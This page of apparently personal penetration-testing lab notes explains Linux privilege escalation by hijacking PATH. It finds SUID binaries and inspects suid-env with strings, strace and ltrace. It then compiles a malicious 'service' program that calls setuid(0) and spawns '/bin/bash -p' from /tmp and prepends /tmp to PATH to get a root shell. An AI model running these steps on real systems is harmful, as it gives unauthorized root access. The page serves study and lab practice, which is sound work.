<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PATH Environment Variable</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PATH Environment Variable</h1><br/>• The PATH environment variable contains a list of directories where the shell should try to find programs.<br />• If a <span style="color:#1e90ff;">program</span> tries to execute <span style="color:#ff8700;">another program</span>, <span style="text-decoration:underline;">but only specifies the </span><span style="color:#ff8700;text-decoration:underline;">program</span><span style="text-decoration:underline;"> name</span>, rather than its full (absolute) path, the shell will search the PATH directories until it is found.<br />   ◇ the name of that &quot;sub-<span style="color:#ff8700;">program</span>&quot; is likely embedded in the executable file of the <span style="color:#1e90ff;">principal program</span> as a string.<br />   ◇ We can run <span style="text-decoration:underline;">strings</span> on the executable file of the <span style="color:#1e90ff;">principal program</span> to find strings of characters that could be referring to a <span style="color:#ff8700;">another program</span><br />   ◇ We can also use <span style="text-decoration:underline;">strace</span> to see how the <span style="color:#1e90ff;">program</span> is executing. Another program called <span style="text-decoration:underline;">ltrace</span> may also be of use<br />• Since a user has full control over their PATH variable, we can tell the shell to first look for programs in a directory we can write to.<br /><br />1. manually locate files with the SUID or SGID bits set:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;find&nbsp;/&nbsp;-type&nbsp;f&nbsp;-a&nbsp;\(&nbsp;-perm&nbsp;-u+s&nbsp;-o&nbsp;-perm&nbsp;-g+s&nbsp;\)&nbsp;-exec&nbsp;ls&nbsp;-l&nbsp;{}&nbsp;\;&nbsp;2&gt;&nbsp;/dev/null</div></div><br />    <a href=""><img src="images/1308-1.png" alt="images/1308-1.png" /></a><br />    <a href=""><img src="images/1308-2.png" alt="images/1308-2.png" /></a><br />2. Run strings on the SUID file:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;strings&nbsp;/usr/local/bin/suid-env</div></div><br />    <a href=""><img src="images/1308-3.png" alt="images/1308-3.png" /></a><br />    The <span style="color:#1e90ff;">program</span>(suid-env) could be trying to run the <span style="color:#ff8700;">service program</span> without a full path*. We have to verify that.<br />    *If it run with a full path like the below one:<br />    <a href=""><img src="images/1308-4.png" alt="images/1308-4.png" /></a><br />    see the next chapter <a href="_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--7._SUID-SGID_Executables--Abusing_Shell_Features_(define_user_functions).html">Abusing Shell Features (define user functions)</a><br />4. To run the <span style="color:#ff8700;">service</span> program, linux is searching on this directories<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;print&nbsp;$PATH</div></div><br />    <a href=""><img src="images/1308-5.png" alt="images/1308-5.png" /></a><br />5. We can verify this <br />   ◇ with <span style="text-decoration:underline;">strace</span>:<br />       <div class="codebox"><div class="codebox">target@debian:~$&nbsp;strace&nbsp;-v&nbsp;-f&nbsp;-e&nbsp;execve&nbsp;/usr/local/bin/suid-env&nbsp;2&gt;&amp;1&nbsp;|&nbsp;grep&nbsp;service</div></div><br />       <a href=""><img src="images/1308-6.png" alt="images/1308-6.png" /></a><br />   ◇ with <span style="text-decoration:underline;">ltrace</span>:<br />        <div class="codebox"><div class="codebox">target@debian:~$&nbsp;ltrace&nbsp;/usr/local/bin/suid-env&nbsp;2&gt;&amp;1&nbsp;|&nbsp;grep&nbsp;service</div></div><br />        <a href=""><img src="images/1308-7.png" alt="images/1308-7.png" /></a><br />6. what we want to do is change the directory from where <span style="color:#ff8700;">service</span> is called from        <br />7. Create a <span style="color:#ff0000;">malicious service file</span> called “service.c” in the folder /tmp<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;vim&nbsp;service.c<br />#&nbsp;i&nbsp;--&gt;&nbsp;insert<br />#Esc&nbsp;--&gt;&nbsp;esc&nbsp;from&nbsp;insert<br />#:w&nbsp;--&gt;&nbsp;write(save)<br />#:q&nbsp;--&gt;&nbsp;exit</div></div><br />    <div class="codebox"><div class="codebox">int&nbsp;main()&nbsp;<span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;setuid(0);<br />&nbsp;&nbsp;&nbsp;&nbsp;system(&quot;/bin/bash&nbsp;-p&quot;);<br /><span style="color:#000000;font-weight:400">}</span></div></div><br />8. Compile service.c into a file called service:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;gcc&nbsp;-o&nbsp;/tmp/service&nbsp;/tmp/service.c</div></div><br />9. Prepend the /tmp directory (or where the <span style="color:#ff0000;">new malicious service executable</span> is located) to the PATH variable, and execute the <span style="color:#1e90ff;">SUID file</span> for a root shell:<br />     <div class="codebox"><div class="codebox">target@debian:~$&nbsp;export&nbsp;PATH=/tmp:$PATH</div></div><br />    <a href=""><img src="images/1308-8.png" alt="images/1308-8.png" /></a><br />10. Now we can run the SUID file that we have found at point 1 and become root<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;/usr/local/bin/suid-env</div></div><br /></div>
</body>
</html>
